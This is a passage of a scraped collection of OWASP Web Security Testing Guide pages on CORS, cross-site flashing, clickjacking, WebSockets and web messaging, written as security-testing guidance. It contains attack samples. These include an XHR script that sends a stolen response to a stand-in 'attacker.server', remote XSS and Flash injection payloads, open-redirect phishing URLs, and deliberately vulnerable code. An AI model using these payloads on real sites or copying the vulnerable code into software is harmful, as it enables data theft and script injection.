Access-Control-Request-Method & Access-Control-Allow-Method\n\nThe `Access-Control-Request-Method` header is used when a browser performs a preflight OPTIONS request and lets the client indicate the request method of the final request. On the other hand, the `Access-Control-Allow-Method` is a response header used by the server to describe the methods the clients are allowed to use.\n\n### Access-Control-Request-Headers & Access-Control-Allow-Headers\n\nThese two headers are used between the browser and the server to determine which headers can be used to perform a cross-origin request.\n\n### Access-Control-Allow-Credentials\n\nThis response header allows browsers to read the response when credentials are passed. When the header is sent, the web application must set an origin to the value of the `Access-Control-Allow-Origin` header. The `Access-Control-Allow-Credentials` header cannot be used along with the `Access-Control-Allow-Origin` header whose value is the `*` wildcard like the following:\n\n```http\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Input Validation\n\nXHR L2 introduces the possibility of creating a cross-domain request using the XHR API for backwards compatibility. This can introduce security vulnerabilities that in XHR L1 were not present. Interesting points of the code to exploit would be URLs that are passed to XMLHttpRequest without validation, specially if absolute URLs are allowed because that could lead to code injection. Likewise, other part of the application that can be exploited is if the response data is not escaped and we can control it by providing user-supplied input.\n\n### Other Headers\n\nThere are other headers involved like `Access-Control-Max-Age` that determines the time a preflight request can be cached in the browser, or `Access-Control-Expose-Headers` that indicates which headers are safe to expose to the API of a CORS API specification.\n\nTo review CORS headers, refer to the [CORS MDN document](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers).\n\n## Test Objectives\n\n- Identify endpoints that implement CORS.\n- Ensure that the CORS configuration is secure or harmless.\n\n## How to Test\n\nA tool such as [ZAP](https://www.zaproxy.org) can enable testers to intercept HTTP headers, which can reveal how CORS is used. Testers should pay particular attention to the origin header to learn which domains are allowed. Also, in some cases, manual inspection of the JavaScript is needed to determine whether the code is vulnerable to code injection due to improper handling of user supplied input.\n\n### CORS Misconfiguration\n\nSetting the wildcard to the `Access-Control-Allow-Origin header` (that is, `Access-Control-Allow-Origin: *`) is not secure if the response contains sensitive information. Although it cannot be used with the `Access-Control-Allow-Credentials: true` at the same time, it can be dangerous where the access control is done solely by the firewall rules or the source IP addresses, other than being protected by credentials.\n\n#### Wildcard Access-Control-Allow-Origin\n\nA tester can check if the `Access-Control-Allow-Origin: *` exists in the HTTP response messages.\n\n```http\nHTTP/1.1 200 OK\n[...]\nAccess-Control-Allow-Origin: *\nContent-Length: 4\nContent-Type: application/xml\n\n[Response Body]\n```\n\nIf a response contains sensitive data, an attacker can steal it through the usage of XHR:\n\n```html\n<html>\n    <head></head>\n    <body>\n        <script>\n            var xhr = new XMLHttpRequest();\n            xhr.onreadystatechange = function() {\n                if (this.readyState == 4 && this.status == 200) {\n                    var xhr2 = new XMLHttpRequest();\n                    // attacker.server: attacker listener to steal response\n                    xhr2.open(\"POST\", \"https://attacker.server\", true);\n                    xhr2.send(xhr.responseText);\n                }\n            };\n            // victim.site: vulnerable server with `Access-Control-Allow-Origin: *` header \n            xhr.open(\"GET\", \"https://victim.site\", true);\n            xhr.send();\n        </script>\n    </body>\n</html>\n```\n\n#### Dynamic CORS Policy\n\nA modern web application or API may be implemented to allow cross-origin requests dynamically, generally in order to allow the requests from the sub domains like the following:\n\n```php\nif (preg_match('|\\.example.com$|', $_SERVER['SERVER_NAME'])) {\n   header(\"Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}\");\n   ...\n}\n```\n\nIn this example, all the requests from the subdomains of example.com will be allowed. It must be ensured that the regular expression that is used to match is complete. Otherwise, if it was simply matched with `example.com` (without `$` appended), attackers might be able to bypass the CORS policy by appending their domain to the `Origin` header.\n\n```http\nGET /test.php HTTP/1.1\nHost: example.com\n[...]\nOrigin: https://example.com.attacker.com\nCookie: <session cookie>\n```\n\nWhen the request above is sent, if the following response is returned with the `Access-Control-Allow-Origin` whose value is the same as the attacker's input, the attacker can read the response afterwards and access sensitive information that is only accessible by a victim user.\n\n```http\nHTTP/1.1 200 OK\n[...]\nAccess-Control-Allow-Origin: https://example.com.attacker.com\nAccess-Control-Allow-Credentials: true\nContent-Length: 4\nContent-Type: application/xml\n\n[Response Body]\n```\n\n### Input Validation Weakness\n\nThe CORS concept can be viewed from a completely different angle. An attacker may allow their CORS policy on purpose to inject code to the target web application.\n\n#### Remote XSS with CORS\n\nThis code makes a request to the resource passed after the `#` character in the URL, initially used to get resources in the same server.\n\nVulnerable code:\n\n```html\n<script>\n    var req = new XMLHttpRequest();\n\n    req.onreadystatechange = function() {\n        if(req.readyState==4 && req.status==200) {\n            document.getElementById(\"div1\").innerHTML=req.responseText;\n        }\n    }\n\n    var resource = location.hash.substring(1);\n    req.open(\"GET\",resource,true);\n    req.send();\n</script>\n\n<body>\n    <div id=\"div1\"></div>\n</body>\n```\n\nFor example, a request like this will show the contents of the `profile.php` file:\n\n`https://example.foo/main.php#profile.php`\n\nRequest and response generated by `https://example.foo/profile.php`:\n\n```html\nGET /profile.php HTTP/1.1\nHost: example.foo\n[...]\nReferer: https://example.foo/main.php\nConnection: keep-alive\n\nHTTP/1.1 200 OK\n[...]\nContent-Length: 25\nContent-Type: text/html\n\n[Response Body]\n```\n\nNow, as there is no URL validation we can inject a remote script, that will be injected and executed in the context of the `example.foo` domain, with a URL like this:\n\n```text\nhttps://example.foo/main.php#https://attacker.bar/file.php\n```\n\nRequest and response generated by `https://attacker.bar/file.php`:\n\n```html\nGET /file.php HTTP/1.1\nHost: attacker.bar\n[...]\nReferer: https://example.foo/main.php\norigin: https://example.foo\n\nHTTP/1.1 200 OK\n[...]\nAccess-Control-Allow-Origin: *\nContent-Length: 92\nContent-Type: text/html\n\nInjected Content from attacker.bar <img src=\"#\" onerror=\"alert('Domain: '+document.domain)\">\n```\n\n## References\n\n- [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)\n- [MDN Cross-Origin Resources Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)\n", "timestamp": "2025-10-24T11:39:58.491668"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md", "content": "# Testing for Cross Site Flashing\n\n|ID          |\n|------------|\n|WSTG-CLNT-08|\n\n## Summary\n\nActionScript, based on ECMAScript, is the language used by Flash applications when dealing with interactive needs. There are three versions of the ActionScript language. ActionScript 1.0 and ActionScript 2.0 are very similar with ActionScript 2.0 being an extension of ActionScript 1.0. ActionScript 3.0, introduced with Flash Player 9, is a rewrite of the language to support object orientated design.\n\nActionScript, like every other language, has some implementation patterns which could lead to security issues. In particular, since Flash applications are often embedded in browsers, vulnerabilities like DOM-based Cross Site Scripting (DOM XSS) could be present in flawed Flash applications.\n\nCross-Site Flashing (XSF) is a vulnerability that has a similar impact to XSS.\n\nXSF occurs when the following scenarios are initiated from different domains:\n\n- One movie loads another movie with `loadMovie*` functions (or other hacks) and has access to the same sandbox, or part of it.\n- An HTML page uses JavaScript to command an Adobe Flash movie, for example, by calling:\n    - `GetVariable` to access Flash public and static objects from JavaScript as a string.\n    - `SetVariable` to set a static or public Flash object to a new string value with JavaScript.\n- Unexpected communications between the browser and SWF application, which could result in stealing data from the SWF application.\n\nXSF may be performed by forcing a flawed SWF to load an external evil Flash file. This attack could result in XSS or in the modification of the GUI in order to fool a user to insert credentials on a fake Flash form. XSF could be used in the presence of Flash HTML Injection or external SWF files when `loadMovie*` methods are used.\n\n### Open Redirectors\n\nSWFs have the capability to navigate the browser. If the SWF takes the destination in as a FlashVar, then the SWF may be used as an open redirector. An open redirector is any piece of website functionality on a trusted website that an attacker can use to redirect the end user to a malicious website. These are frequently used within phishing attacks. Similar to cross-site scripting, the attack involves a user clicking on a malicious link.\n\nIn the Flash case, the malicious URL might look like:\n\n```text\nhttps://trusted.example.org/trusted.swf?getURLValue=https://www.evil-spoofing-website.org/phishEndUsers.html\n```\n\nIn the above example, an end user might see that the URL begins with their favorite trusted website and click on it. The link would load the trusted SWF which takes the `getURLValue` and provides it to an ActionScript browser navigation call:\n\n```actionscript\ngetURL(_root.getURLValue,\"_self\");\n```\n\nThis would navigate the browser to the malicious URL provided by the attacker. At this point, the phisher has successfully leveraged the trust the user has in trusted.example.org to trick the user into visiting their malicious website. From there, they could launch a 0-day, conduct spoofing of the original website, or any other type of attack. SWFs may unintentionally be acting as an open-redirector on the website.\n\nDevelopers should avoid taking full URLs as FlashVars. If they only plan to navigate within their own website, then they should use relative URLs or verify that the URL begins with a trusted domain and protocol.\n\n### Attacks and Flash Player Version\n\nSince May 2007, three new versions of Flash Player were released by Adobe. Every new version restricts some of the attacks previously described.\n\n| Player Version | `asfunction` | ExternalInterface | GetURL | HTML Injection |\n|----------------|--------------|-------------------|--------|----------------|\n| v9.0 r47/48    |  Yes         |   Yes             | Yes    |     Yes        |\n| v9.0 r115      |  No          |   Yes             | Yes    |     Yes        |\n| v9.0 r124      |  No          |   Yes             | Yes    |     Partially  |\n\n## Test Objectives\n\n- Decompile and analyze the application's code.\n- Assess sinks inputs and unsafe method usages.\n\n## How to Test\n\nSince the first publication of \"Testing Flash Applications\", new versions of Flash Player were released in order to mitigate some of the attacks which will be described. Nevertheless, some issues still remain exploitable because they are the result of insecure programming practices.\n\n### Decompilation\n\nSince SWF files are interpreted by a virtual machine embedded in the player itself, they can be potentially decompiled and analyzed. The most known and free ActionScript 2.0 decompiler is flare.\n\nTo decompile a SWF file with flare just type:\n\n`$ flare hello.swf`\n\nThis results in a new file called hello.flr.\n\nDecompilation helps testers because it allows for white-box testing of the Flash applications. A quick web search can lead you to various disassemblers and flash security tools.\n\n### Undefined Variables FlashVars\n\nFlashVars are the variables that the SWF developer planned on receiving from the web page. FlashVars are typically passed in from the Object or Embed tag within the HTML. For instance:\n\n```html\n<object width=\"550\" height=\"400\" classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"\ncodebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0\">\n    <param name=\"movie\" value=\"somefilename.swf\">\n    <param name=\"FlashVars\" value=\"var1=val1&var2=val2\">\n    <embed src=\"somefilename.swf\" width=\"550\" height=\"400\" FlashVars=\"var1=val1&var2=val2\">\n</embed>\n</object>\n```\n\nFlashVars can also be initialized from the URL:\n\n`https://www.example.org/somefilename.swf?var1=val1&var2=val2`\n\nIn ActionScript 3.0, a developer must explicitly assign the FlashVar values to local variables. Typically, this looks like:\n\n```actionscript\nvar paramObj:Object = LoaderInfo(this.root.loaderInfo).parameters;\nvar var1:String = String(paramObj[\"var1\"]);\nvar var2:String = String(paramObj[\"var2\"]);\n```\n\nIn ActionScript 2.0, any uninitialized global variable is assumed to be a FlashVar. Global variables are those variables that are prepended by `_root`, `_global` or `_level0`. This means that if an attribute like `_root.varname` is undefined throughout the code flow, it could be overwritten by URL parameters:\n\n`https://victim/file.swf?varname=value`\n\nRegardless of whether you are looking at ActionScript 2.0 or ActionScript 3.0, FlashVars can be a vector of attack. Let's look at some ActionScript 2.0 code that is vulnerable:\n\nExample:\n\n```actionscript\nmovieClip 328 __Packages.Locale {\n\n#initclip\n    if (!_global.Locale) {\n    var v1 = function (on_load) {\n        var v5 = new XML();\n        var v6 = this;\n        v5.onLoad = function (success) {\n        if (success) {\n            trace('Locale loaded xml');\n            var v3 = this.xliff.file.body.$trans_unit;\n            var v2 = 0;\n            while (v2 < v3.length) {\n            Locale.strings[v3[v2]._resname] = v3[v2].source.__text;\n            ++v2;\n            }\n            on_load();\n        } else {}\n        };\n        if (_root.language != undefined) {\n        Locale.DEFAULT_LANG = _root.language;\n        }\n        v5.load(Locale.DEFAULT_LANG + '/player_' +\n                            Locale.DEFAULT_LANG + '.xml');\n    };\n```\n\nThe above code could be attacked by requesting:\n\n`https://victim/file.swf?language=https://evil.example.org/malicious.xml?`\n\n### Unsafe Methods\n\nWhen an entry point is identified, the data it represents could be used by unsafe methods. If the data is not filtered or validated, it could lead to some vulnerabilities.\n\nUnsafe Methods since version r47 are:\n\n- `loadVariables()`\n- `loadMovie()`\n- `getURL()`\n- `loadMovie()`\n- `loadMovieNum()`\n- `FScrollPane.loadScrollContent()`\n- `LoadVars.load`\n- `LoadVars.send`\n- `XML.load( 'url' )`\n- `LoadVars.load( 'url' )`\n- `Sound.loadSound( 'url' , isStreaming );`\n- `NetStream.play( 'url' );`\n- `flash.external.ExternalInterface.call(_root.callback)`\n- `htmlText`\n\n### Exploitation by Reflected XSS\n\nThe swf file should be hosted on the victim's host, and the techniques of reflected XSS must be used. An attacker forces the browser to load a pure swf file directly in the location bar (by redirection or social engineering) or by loading it through an iframe from an evil page:\n\n```html\n<iframe src='https://victim/path/to/file.swf'></iframe>\n```\n\nIn this situation, the browser will self-generate an HTML page as if it were hosted by the victim host.\n\n### GetURL (AS2) / NavigateToURL (AS3)\n\nThe GetURL function in ActionScript 2.0 and NavigateToURL in ActionScript 3.0 lets the movie load a URI into the browser's window. If an undefined variable is used as the first argument for getURL:\n\n`getURL(_root.URI,'_targetFrame');`\n\nOr if a FlashVar is used as the parameter that is passed to a navigateToURL function:\n\n```actionscript\nvar request:URLRequest = new URLRequest(FlashVarSuppliedURL);\nnavigateToURL(request);\n```\n\nThen this will mean it's possible to call JavaScript in the same domain where the movie is hosted by requesting:\n\n`https://victim/file.swf?URI=javascript:evilcode`\n\n`getURL('javascript:evilcode','_self');`\n\nThe same is possible when only some part of `getURL` is controlled via DOM injection with Flash JavaScript injection:\n\n```js\ngetUrl('javascript:function('+_root.arg+')')\n```\n\n### Using `asfunction`\n\nYou can use the special `asfunction` protocol to cause the link to execute an ActionScript function in a SWF file instead of opening a URL. Until release Flash Player 9 r48 `asfunction` could be used on every method which has a URL as an argument. After that release, `asfunction` was restricted to use within an HTML TextField.\n\nThis means that a tester could try to inject:\n\n```actionscript\nasfunction:getURL,javascript:evilcode\n```\n\nin every unsafe method, such as:\n\n```actionscript\nloadMovie(_root.URL)\n```\n\nby requesting:\n\n`https://victim/file.swf?URL=asfunction:getURL,javascript:evilcode`\n\n### ExternalInterface\n\n`ExternalInterface.call` is a static method introduced by Adobe to improve player/browser interaction for both ActionScript 2.0 and ActionScript 3.0.\n\nFrom a security point of view it could be abused when part of its argument could be controlled:\n\n```actionscript\nflash.external.ExternalInterface.call(_root.callback);\n```\n\nthe attack pattern for this kind of flaw may be something like the following:\n\n```js\neval(evilcode)\n```\n\nsince the internal JavaScript that is executed by the browser will be something similar to:\n\n```js\neval('try { __flash__toXML('+__root.callback+') ; } catch (e) { \"<undefined/>\"; }')\n```\n\n### HTML Injection\n\nTextField Objects can render minimal HTML by setting:\n\n```actionscript\ntf.html = true\ntf.htmlText = '<tag>text</tag>'\n```\n\nSo if some part of text could be controlled by the tester, an `<a>` tag or an image tag could be injected resulting in modifying the GUI or a XSS attack on the browser.\n\nSome attack examples with `<a>` tag:\n\n- Direct XSS: `<a href='javascript:alert(123)'>`\n- Call a function: `<a href='asfunction:function,arg'>`\n- Call SWF public functions: `<a href='asfunction:_root.obj.function, arg'>`\n- Call native static as function: `<a href='asfunction:System.Security.allowDomain,evilhost'>`\n\nAn image tag could be used as well:\n\n```html\n<img src='https://evil/evil.swf'>\n```\n\nIn this example, `.swf` is necessary to bypass the Flash Player internal filter:\n\n```html\n<img src='javascript:evilcode//.swf'>\n```\n\nSince the release of Flash Player 9.0.124.0, XSS is no longer exploitable, but GUI modification could still be accomplished.\n\nThe following tools may be helpful in working with SWF:\n\n- [OWASP SWFIntruder](https://wiki.owasp.org/index.php/Category:SWFIntruder)\n- [Disassembler – Flasm](https://flasm.sourceforge.net/)\n- [Swfmill – Convert Swf to XML and vice versa](https://www.swfmill.org/)\n", "timestamp": "2025-10-24T11:39:58.589902"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking.md", "content": "# Testing for Clickjacking\n\n|ID          |\n|------------|\n|WSTG-CLNT-09|\n\n## Summary\n\nClickjacking, a subset of UI redressing, is a malicious technique whereby a web user is deceived into interacting (in most cases by clicking) with something other than what the user believes they are interacting with. This type of attack, either alone or in conjunction with other attacks, could potentially send unauthorized commands or reveal confidential information while the victim is interacting with seemingly-harmless web pages. The term clickjacking was coined by Jeremiah Grossman and Robert Hansen in 2008.\n\nA clickjacking attack uses seemingly-harmless features of HTML and JavaScript to force the victim to perform undesired actions, such as clicking an invisible button that performs an unintended operation. This is a client-side security issue that affects a variety of browsers and platforms.\n\nTo carry out this attack, an attacker creates a seemingly-harmless web page that loads the target application through the use of an inline frame (concealed with CSS code). Once this is done, an attacker may induce the victim to interact with the web page by other means (through, for example, social engineering). Like other attacks, a common prerequisite is that the victim is authenticated against the attacker’s target application.\n\n![Clickjacking illustration](images/Clickjacking_description.png)\\\n*Figure 4.11.9-1: Clickjacking inline frame illustration*\n\nThe victim surfs the attacker's web page with the intention of interacting with the visible user interface, but is inadvertently performing actions on the hidden web page. Using the hidden page, an attacker can deceive users into performing actions they never intended to perform through the positioning of the hidden elements in the web page.\n\n![Masked inline frame illustration](images/Masked_iframe.png)\\\n*Figure 4.11.9-2: Masked inline frame illustration*\n\nThe power of this method is that the actions performed by the victim are originated from the hidden but authentic target web page. Consequently, some of the anti-CSRF protections deployed by the developers to protect the web page from CSRF attacks could be bypassed.\n\n## Test Objectives\n\n- Assess application vulnerability to clickjacking attacks.\n\n## How to Test\n\nAs mentioned above, this type of attack is often designed to allow an attacker to induce users’ actions on the target site, even if anti-CSRF tokens are being used.\n\n### Load Target Web Page on a HTML Interpreter Using HTML iframe Tag\n\nSites that do not protected against frame busting are vulnerable to clickjacking attack. If the `https://www.target.site` web page is successfully loaded into a frame, then the site is vulnerable to Clickjacking. An example of HTML code to create this testing web page is displayed in the following snippet:\n\n```htmls\n    <html>\n        <head>\n            <title>Clickjack test web page</title>\n        </head>\n        <body>\n            <iframe src=\"https://www.target.site\" width=\"400\" height=\"400\"></iframe>\n        </body>\n    </html>\n```\n\n### Test Application against Disabled JavaScript\n\nSince these types of client-side protections relies on JavaScript frame busting code, if the victim has JavaScript disabled or it is possible for an attacker to disable JavaScript code, the web page will not have any protection mechanism against clickjacking.\n\nThere are few deactivation techniques that can be used with frames. More in depth techniques can be found on the [Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html).\n\n### Sandbox Attribute\n\nWith HTML5 a new attribute called \"sandbox\" is available. It enables a set of restrictions on content loaded into the iframe.\n\nExample:\n\n```html\n<iframe src=\"https://example.org\" sandbox></iframe>\n```\n\n### Test Application on Compatibility and Accessibility Mode\n\nMobile versions of the web page are usually smaller and faster than the desktop ones, and they have to be less complex than the main application. Mobile variants often have less protection. However, an attacker can fake the real origin given by a web browser, and a non-mobile victim may be able to visit an application made for mobile users. This scenario could allow the attacker to exploit a mobile version of the web page.\nApplications running on acessibility mode should also be tested against clickjacking, because site framming could be affected.\n\n### Server-Side Protection: Using Frame-Ancestors Directive of Content Security Policy\n\nThe HTTP Content-Security-Policy (CSP) response header allows web page administrators to control resources the user agent is allowed to load for a given web page. The `frame-ancestors` directive in the HTTP CSP specifies the acceptable parents that may embed a web page using the `<frame>`, `<iframe>`, `<object>`, `<embed>`, or `<applet>` tags.\n\n#### Testing Content Security Policy Response Header\n\n- Using a browser, open developer tools and access the target web page. Navigate to the Network tab.\n- Look for the request that loads the web page. It should have the same domain as the web page - usually be the first item on the Network tab.\n- Once you click on the file, more information will come up. Look for a 200 OK response code.\n- Scroll down to the Response Header Section. Content-Security-Policy section indicates level of protecting adopted.\n\nAlternatively view the web page source to find Content-Security-Policy in a meta tag. WSTG has a detailed information on [Test for Content Security Policy](../02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy.md).\n\n##### Proxies\n\nWeb proxies are known for adding and stripping headers. In the case in which a web proxy strips the `X-FRAME-OPTIONS` header then the site loses its framing protection.\n\n##### Mobile Version of the Application\n\nIn this case, because the `X-FRAME-OPTIONS` HTTP header has to be implemented in every page of the application, developers may have not protected every single page on the mobile version.\n\n### Remediation\n\n- For measures to prevent Clickjacking, see the [Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html).\n- For interactive labs on Clickjacking visit [Port Swigger Web Page](https://portswigger.net/web-security/clickjacking)\n- For additional resources on ClickJacking visit the [OWASP community](https://owasp.org/www-community/attacks/Clickjacking)\n\n## References\n\n- [OWASP Clickjacking](https://owasp.org/www-community/attacks/Clickjacking)\n- [Wikipedia Clickjacking](https://en.wikipedia.org/wiki/Clickjacking)\n- [Gustav Rydstedt, Elie Bursztein, Dan Boneh, and Collin Jackson: \"Busting Frame Busting: a Study of Clickjacking Vulnerabilities on Popular Sites\"](https://seclab.stanford.edu/websec/framebusting/framebust.pdf)\n", "timestamp": "2025-10-24T11:39:58.656730"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets.md", "content": "# Testing WebSockets\n\n|ID          |\n|------------|\n|WSTG-CLNT-10|\n\n## Summary\n\nTraditionally, the HTTP protocol only allows one request/response per TCP connection. Asynchronous JavaScript and XML (AJAX) allows clients to send and receive data asynchronously (in the background without a page refresh) to the server, however, AJAX requires the client to initiate the requests and wait for the server responses (half-duplex).\n\n[WebSockets](https://html.spec.whatwg.org/multipage/web-sockets.html#network) allow the client or server to create a 'full-duplex' (two-way) communication channel, allowing the client and server to truly communicate asynchronously. WebSockets conduct their initial *upgrade* handshake over HTTP and from then on all communication is carried out over TCP channels by use of frames. For more, see the [WebSocket Protocol](https://tools.ietf.org/html/rfc6455).\n\n### Origin\n\nIt is the server’s responsibility to verify the [`Origin` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin) in the initial HTTP WebSocket handshake. If the server does not validate the origin header in the initial WebSocket handshake, the WebSocket server may accept connections from any origin. This could allow attackers to communicate with the WebSocket server cross-domain allowing for CSRF-like issues. See also [Top 10-2017 A5-Broken Access Control](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control). The exploit for this weakness is called Cross-Site Websocket Hijacking (CSWH or CSWSH).\n\n### Confidentiality and Integrity\n\nWebSockets can be used over unencrypted TCP or over encrypted TLS. To use unencrypted WebSockets the `ws://` URI scheme is used (default port 80), to use encrypted (TLS) WebSockets the `wss://` URI scheme is used (default port 443). See also [Top 10-2017 A3-Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure).\n\n### Input Sanitization\n\nAs with any data originating from untrusted sources, the data should be properly sanitized and encoded. See also [Top 10-2017 A1-Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection) and [Top 10-2017 A7-Cross-Site Scripting (XSS)](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)).\n\n## Test Objectives\n\n- Identify the usage of WebSockets.\n- Assess its implementation by using the same tests on normal HTTP channels.\n\n## How to Test\n\n### Black-Box Testing\n\n1. Identify that the application is using WebSockets.\n   - Inspect the client-side source code for the `ws://` or `wss://` URI scheme.\n   - Use Google Chrome's Developer Tools to view the Network WebSocket communication.\n   - Use [ZAP's](https://www.zaproxy.org) WebSocket tab.\n2. Origin.\n   - Using a WebSocket client (one can be found in the Tools section below) attempt to connect to the remote WebSocket server. If a connection is established the server may not be checking the origin header of the WebSocket handshake.\n3. Confidentiality and Integrity.\n   - Check that the WebSocket connection is using TLS to transport sensitive information `wss://`.\n   - Check the HTTPS Implementation for security issues (Valid Certificate, BEAST, CRIME, RC4, etc). Refer to the [Testing for Weak Transport Layer Security](../09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security.md) section of this guide.\n4. Authentication.\n   - WebSockets do not handle authentication, normal black-box authentication tests should be carried out. Refer to the [Authentication Testing](../04-Authentication_Testing/README.md) sections of this guide.\n5. Authorization.\n   - WebSockets do not handle authorization, normal black-box authorization tests should be carried out. Refer to the [Authorization Testing](../05-Authorization_Testing/README.md) sections of this guide.\n6. Input Sanitization.\n   - Use [ZAP's](https://www.zaproxy.org) WebSocket tab to replay and fuzz WebSocket request and responses. Refer to the [Testing for Data Validation](../07-Input_Validation_Testing/README.md) sections of this guide.\n\n#### Example 1\n\nOnce we have identified that the application is using WebSockets (as described above) we can use the [Zed Attack Proxy (ZAP)](https://www.zaproxy.org) to intercept the WebSocket request and responses. ZAP can then be used to replay and fuzz the WebSocket request/responses.\n\n![ZAP WebSockets](images/OWASP_ZAP_WebSockets.png)\\\n*Figure 4.11.10-1: ZAP WebSockets*\n\n#### Example 2\n\nUsing a WebSocket client (one can be found in the Tools section below) attempt to connect to the remote WebSocket server. If the connection is allowed the WebSocket server may not be checking the WebSocket handshake's origin header. Attempt to replay requests previously intercepted to verify that cross-domain WebSocket communication is possible.\n\n![WebSocket Client](images/WebSocket_Client.png)\\\n*Figure 4.11.10-2: WebSocket Client*\n\n### Gray-Box Testing\n\nGray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. The only difference here is that you may have API documentation for the application being tested which includes the expected WebSocket request and responses.\n\n## Tools\n\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org)\n- [WebSocket Client](https://github.com/ethicalhack3r/scripts/blob/master/WebSockets.html)\n- [Google Chrome Simple WebSocket Client](https://chrome.google.com/webstore/detail/simple-websocket-client/pfdhoblngboilpfeibdedpjgfnlcodoo?hl=en)\n\n## References\n\n- [HTML5 Rocks - Introducing WebSockets: Bringing Sockets to the Web](https://www.html5rocks.com/en/tutorials/websockets/basics/)\n- [W3C - The WebSocket API](https://html.spec.whatwg.org/multipage/web-sockets.html#network)\n- [IETF - The WebSocket Protocol](https://tools.ietf.org/html/rfc6455)\n- [CWE-1385: Missing Origin Validation in WebSockets](https://cwe.mitre.org/data/definitions/1385.html)\n- [Christian Schneider - Cross-Site WebSocket Hijacking (CSWSH)](https://www.christian-schneider.net/blog/cross-site-websocket-hijacking/)\n- [Robert Koch- On WebSockets in Penetration Testing](https://repositum.tuwien.at/retrieve/21955)\n- [DigiNinja - ZAP and Web Sockets](https://digi.ninja/blog/zap_web_sockets.php)\n", "timestamp": "2025-10-24T11:39:58.704528"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging.md", "content": "# Testing Web Messaging\n\n|ID          |\n|------------|\n|WSTG-CLNT-11|\n\n## Summary\n\nWeb Messaging (also known as [Cross Document Messaging](https://html.spec.whatwg.org/multipage/web-messaging.html#web-messaging)) allows applications running on different domains to communicate in a secure manner. Before the introduction of web messaging, the communication of different origins (between iframes, tabs and windows) was restricted by the same origin policy and enforced by the browser. Developers used multiple hacks in order to accomplish these tasks, and most of them were mainly insecure.\n\nThis restriction within the browser is in place to prevent a malicious website from reading confidential data from other iframes, tabs, etc; however, there are some legitimate cases where two trusted websites need to exchange data with each other. To meet this need, Cross Document Messaging was introduced in the [WHATWG HTML5](https://html.spec.whatwg.org/multipage/) draft specification and was implemented in all major browsers. It enables secure communications between multiple origins across iframes, tabs and windows.\n\nThe messaging API introduced the [`postMessage()` method](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage), with which plain-text messages can be sent cross-origin. It consists of two parameters: message, and domain.\n\nThere are some security concerns when using `*` as the domain that we discuss below. In order to receive messages, the receiving website needs to add a new event handler, which has the following attributes:\n\n- Data, the content of the incoming message;\n- Origin of the sender document; and\n- Source, the source window.\n\nHere is an example of the messaging API in use. To send a message:\n\n```js\niframe1.contentWindow.postMessage(\"Hello world\",\"https://www.example.com\");\n```\n\nTo receive a message:\n\n```js\nwindow.addEventListener(\"message\", handler, true);\nfunction handler(event) {\n    if(event.origin === 'chat.example.com') {\n        /* process message (event.data) */\n    } else {\n        /* ignore messages from untrusted domains */\n    }\n}\n```\n\n### Origin Security\n\nThe origin is made up of a scheme, host name, and port. It uniquely identifies the domain sending or receiving the message, and does not include the path or the fragment part of the URL. For instance, `https://example.com` will be considered different from `https://example.com` because the schema of the former is `https`, while the latter is `http`. This also applies to web servers running in the same domain but on different ports.\n\n## Test Objectives\n\n- Assess the security of the message's origin.\n- Validate that it's using safe methods and validating its input.\n\n## How to Test\n\n### Examine Origin Security\n\nTesters should check whether the application code is filtering and processing messages from trusted domains. Within the sending domain, also ensure that the receiving domain is explicitly stated, and that `*` is not used as the second argument of `postMessage()`. This practice could introduce security concerns and could lead to, in the case of a redirection or if the origin changes by other means, the website sending data to unknown hosts, and therefore, leaking confidential data to malicious servers.\n\nIf the website fails to add security controls to restrict the domains or origins that are allowed to send messages to a website, it is likely to introduce a security risk. Testers should examine the code for message event listeners and get the callback function from the `addEventListener` method for further analysis. Domains must always be verified prior to data manipulation.\n\n### Examine Input Validation\n\nAlthough the website is theoretically accepting messages from trusted domains only, data must still be treated as externally-sourced, untrusted data, and processed with the appropriate security controls. Testers should analyze the code and look for insecure methods, in particular where data is being evaluated via `eval()` or inserted into the DOM via the `innerHTML` property, which may create DOM-based XSS vulnerabilities.\n\n### Static Code Analysis\n\nJavaScript code 